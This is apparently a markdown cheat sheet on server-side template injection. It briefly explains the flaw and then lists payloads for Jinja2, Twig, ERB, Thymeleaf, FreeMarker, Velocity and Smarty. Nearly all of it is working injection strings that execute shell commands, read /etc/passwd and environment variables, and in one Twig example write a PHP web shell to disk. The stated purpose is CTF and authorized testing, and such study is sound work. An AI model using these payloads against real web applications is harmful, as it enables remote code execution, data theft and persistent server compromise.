# Server-Side Template Injection (SSTI) Overview

Server-Side Template Injection (SSTI) occurs when untrusted user input is directly concatenated or formatted into a template string rather than being passed as data within a template context. When the server-side template engine compiles the template, it interprets the user input as engine syntax, leading to arbitrary code execution within the application environment.

---

## 1. Vulnerability Architecture & Data Flow

Modern web applications separate presentation logic from data structures using template engines. SSTI arises when the boundary between template logic (code) and user parameters (data) is blurred.

```text
SECURE DATA FLOW (Context Binding):
[ User Input: "{{ 7*7 }}" ]
          │
          ▼
[ Application Layer ] ──(Passed as Context Parameter)──► [ Template Engine ]
                                                                │
                                    ┌───────────────────────────┴───────────────────────────┐
                                    ▼                                                       ▼
                          [ Static Template File ]                               [ Dynamic Context Variable ]
                             "<h1>Hello, %s</h1>"                                        "{{ 7*7 }}"
                                    │                                                       │
                                    └───────────────────────────┬───────────────────────────┘
                                                                ▼
                                                   [ Literal Output Rendered ]
                                                    "<h1>Hello, {{ 7*7 }}</h1>"


VULNERABLE DATA FLOW (String Concatenation):
[ User Input: "{{ 7*7 }}" ]
          │
          ▼
[ Application Layer ] ──(Concatenated into Raw String)──► "<h1>Hello, " + user_input + "</h1>"
                                                                        │
                                                                        ▼
                                                             [ Template Engine ]
                                                                        │
                                                             [ Evaluates Expressions ]
                                                                        │
                                                                        ▼
                                                           [ Evaluated Output Rendered ]
                                                                "<h1>Hello, 49</h1>"

```

# Server-Side Template Injection (SSTI) Reference Guide

A comprehensive quick-reference guide covering Server-Side Template Injection (SSTI) detection, template-engine fingerprinting, context discovery, engine-specific expression syntax, authorized command/file-access testing, and common syntax/filter variations for CTF challenges, security labs, and authorized assessments.

---


### 1. Basic / Most Common Payloads

Use simple mathematical expressions first to determine whether user-controlled input is being evaluated by a server-side template engine.

```text
{{7*7}}
${7*7}
<%= 7*7 %>
{7*7}
#set($x=7*7)
#{7*7}
```

# String / Arithmetic Variants
Useful for distinguishing expression behavior between template engines.
```text
{{7*'7'}}
${7*'7'}
<%= 7*'7' %>
{7*'7'}
${{7*7}}
```

# Initial Context Probes
After confirming expression evaluation, probe commonly exposed template objects.
```text
{{config}}
{{self}}
{{request}}
{{app}}
{{_self}}
${_self}
${app}
<%= self %>
{$smarty}
#{process}
#{global}
<%= process %>
<%= global %>
```

# Compact Fingerprint Set
```text
{{7*7}}
${7*7}
<%= 7*7 %>
{7*7}

{{config}}
${_self}
<%= self %>
{$smarty}
#{process}
```

### 2. Template Engine Fingerprinting

Identify the likely template engine before using engine-specific syntax.

| Engine / Family            | Typical Syntax              | Useful Fingerprints                                  |
|----------------------------|-----------------------------|------------------------------------------------------|
| Jinja / Jinja2             | {{ ... }}                   | __class__, __mro__, __subclasses__, config, request  |
| Twig                       | {{ ... }}                   | _self, _self.env, getFilters(), getFunctions()       |
| ERB / Ruby                 | <%= ... %>                  | ENV, File, Dir, RUBY_VERSION                         |
| Thymeleaf / Spring EL      | ${ ... }                    | T(...), Runtime, System, ProcessBuilder              |
| FreeMarker                 | ${ ... }, <# ... >          | ?new(), freemarker.template.utility                  |
| Apache Velocity            | $..., #set(...)             | $class.inspect(), Java reflection                    |
| Smarty / PHP               | {$...}, {php}...{/php}      | $smarty, PHP functions                               |
| Node / JS Templates        | #{...}, <%= ... %>          | process, require(), fs, child_process                |


### 3. Jinja / Jinja2
Jinja/Jinja2 uses Python-based expression evaluation and often exposes application objects such as config, request, or self.
```text
{{config}}
{{request}}
{{app}}
{{self}}
{{_self}}

{{config.items()}}
{{request.environ}}

{{get_flashed_messages.__globals__}}
{{lipsum.__globals__}}
{{cycler.__init__.__globals__}}
{{joiner.__init__.__globals__}}
{{namespace.__init__.__globals__}}
Python Object Introspection
{{''.__class__}}
{{[].__class__}}
{{{}.__class__}}

{{''.__class__.__mro__}}
{{''.__class__.__mro__[1]}}
{{''.__class__.__mro__[2]}}

{{''.__class__.__base__}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{[].__class__.__base__.__subclasses__()}}
```
Globals / Environment Discovery
```
{{lipsum.__globals__}}
{{cycler.__init__.__globals__}}
{{joiner.__init__.__globals__}}
{{namespace.__init__.__globals__}}

{{config.items()}}
{{request.environ}}
```
Authorized Command-Execution Examples
```text
{{lipsum.__globals__['os'].popen('id').read()}}

{{cycler.__init__.__globals__.os.popen('id').read()}}

{{joiner.__init__.__globals__.os.popen('id').read()}}

{{namespace.__init__.__globals__.os.popen('id').read()}}
```
Additional Runtime Checks
```
{{lipsum.__globals__['os'].popen('whoami').read()}}
{{lipsum.__globals__['os'].popen('ls -la').read()}}
{{lipsum.__globals__['os'].popen('uname -a').read()}}
{{lipsum.__globals__['os'].popen('pwd').read()}}
{{lipsum.__globals__['os'].popen('env').read()}}
File-Read Examples
{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}
{{lipsum.__globals__['os'].popen('cat flag.txt').read()}}
__subclasses__() Techniques
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}

{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

### 4. Twig
Twig shares some surface syntax with Jinja, but its object model and environment APIs differ.
```text
{{_self}}
{{_self.env}}
{{_self.env.getFilters()}}
{{_self.env.getFunctions()}}
```
Undefined Filter Callback
```text
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}

{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}

{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('id')}}
```
Sort / Filter Variants
```text
{{["id"]|sort("system")}}
{{["whoami"]|sort("system")}}
{{["cat /etc/passwd"]|sort("system")}}
```
File-Write Example
```text
{{"<?php system($_GET[cmd]); ?>"|file_put_contents('shell.php')}}
File-write techniques should only be used inside authorized CTF/lab environments.
```

5. ERB / Ruby
ERB uses Ruby expressions embedded using <%= ... %>.
```text
<%= system('id') %>
<%= exec('id') %>
<%= `id` %>
<%= %x{id} %>
<%= IO.popen('id').read %>
```
Command Execution
```text
<%= system('whoami') %>
<%= `whoami` %>
<%= system('cat /etc/passwd') %>
<%= `cat /etc/passwd` %>
<%= IO.popen('cat /etc/passwd').read %>
```
File / Directory Access
```text
<%= IO.read('/etc/passwd') %>
<%= File.open('/etc/passwd').read %>
<%= File.read('/etc/passwd') %>
<%= File.read('flag.txt') %>
<%= Dir.entries('/') %>
<%= Dir.glob('*') %>
<%= Dir.pwd %>
```
Environment / Runtime Information
```text
<%= ENV %>
<%= ENV.to_h %>
<%= RUBY_VERSION %>
<%= RUBY_PLATFORM %>
```

6. Thymeleaf / Spring EL
Thymeleaf applications using Spring EL may expose Java classes through T(...).
```text
${T(java.lang.Runtime).getRuntime().exec('id')}

${T(java.lang.Runtime).getRuntime().exec('whoami')}

${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

${T(java.lang.Runtime).getRuntime().exec('ls -la')}

${T(java.lang.Runtime).getRuntime().exec('uname -a')}

${T(java.lang.Runtime).getRuntime().exec('pwd')}

${T(java.lang.Runtime).getRuntime().exec('env')}

${T(java.lang.Runtime).getRuntime().exec('cat flag.txt')}

${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'})}

${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})}
```
Java System Information
```text
${T(java.lang.System).getProperty('user.name')}
${T(java.lang.System).getProperty('user.home')}
${T(java.lang.System).getProperty('os.name')}
${T(java.lang.System).getenv()}
```
ProcessBuilder
```text
${new java.lang.ProcessBuilder('id').start()}

${new java.lang.ProcessBuilder('whoami').start()}

${new java.lang.ProcessBuilder('cat','/etc/passwd').start()}

${new java.lang.ProcessBuilder('bash','-c','id').start()}
```

7. FreeMarker
FreeMarker supports ${...} interpolation and <#...> directives.
```text
${"freemarker.template.utility.Execute"?new()("id")}

${"freemarker.template.utility.Execute"?new()("whoami")}

${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}

${"freemarker.template.utility.Execute"?new()("ls -la")}

${"freemarker.template.utility.Execute"?new()("uname -a")}

${"freemarker.template.utility.Execute"?new()("pwd")}

${"freemarker.template.utility.Execute"?new()("env")}

${"freemarker.template.utility.Execute"?new()("cat flag.txt")}
```
Explicit Execute Object
```text
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }

<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /etc/passwd") }
```
ObjectConstructor
```
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}

${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","whoami").start()}

${"freemarker.template.utility.ObjectConstructor"?new()("java.io.File","/etc/passwd").exists()}
```

8. Apache Velocity
Velocity uses $ variables and # directives.
```text
#set($x=7*7)
Runtime Reflection
#set($runtime=$class.inspect("java.lang.Runtime").type)
#set($process=$runtime.getRuntime().exec("id"))
Alternative reflection path:
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($ex=$rt.getRuntime().exec('id'))
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($ex=$rt.getRuntime().exec('whoami'))
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($ex=$rt.getRuntime().exec('cat /etc/passwd'))
```
System Information
```text
$class.inspect("java.lang.System").type.getProperty("user.name")
$class.inspect("java.lang.System").type.getProperty("os.name")
$class.inspect("java.lang.System").type.getenv()
```
ProcessBuilder
```text
#set($pb=$class.inspect("java.lang.ProcessBuilder").type)
#set($arr=["id"])
#set($process=$pb.newInstance($arr).start())
```
File Object
```text
#set($file=$class.inspect("java.io.File").type)
#set($obj=$file.newInstance("/etc/passwd"))
$obj.exists()
```
9. Smarty / PHP
Smarty syntax and capabilities vary significantly by version and configuration.
```text
{$smarty.version}
{$smarty.server}
{$smarty.env}
```
Server Information
```text
{$smarty.server.DOCUMENT_ROOT}
{$smarty.server.SERVER_NAME}
```

PHP Blocks
```text
{php}system('id');{/php}
{php}exec('id');{/php}
{php}passthru('id');{/php}
{php}shell_exec('id');{/php}
{php}system('whoami');{/php}
{php}system('cat /etc/passwd');{/php}
{php}system('ls -la');{/php}
{php}system('uname -a');{/php}
{php}system('pwd');{/php}
{php}system('env');{/php}
{php}system('cat flag.txt');{/php}
```
PHP Information / File Access
```text
{php}phpinfo();{/php}
{php}echo `id`;{/php}
{php}echo file_get_contents('/etc/passwd');{/php}
{php}echo readfile('/etc/passwd');{/php}
{php}print_r(scandir('/'));{/php}
```

<div align="center">

### Legal Disclaimer

**Maintained & Curated by 5kullk3r**

*This material is maintained and curated for authorized Capture The Flag (CTF) challenges, educational & ethical purposes, and legal security auditing with explicit permission.*

*Some content may have been collected or adapted from publicly available resources and/or third-party sources. No claim of original authorship or ownership is made over such material unless explicitly stated. Credit and attribution belong to the respective original authors or sources where applicable.*

<sub>Unauthorized system access is illegal. **5kullk3r** does not claim ownership of third-party content and disclaims all liability for any misuse or damages.</sub>

</div>
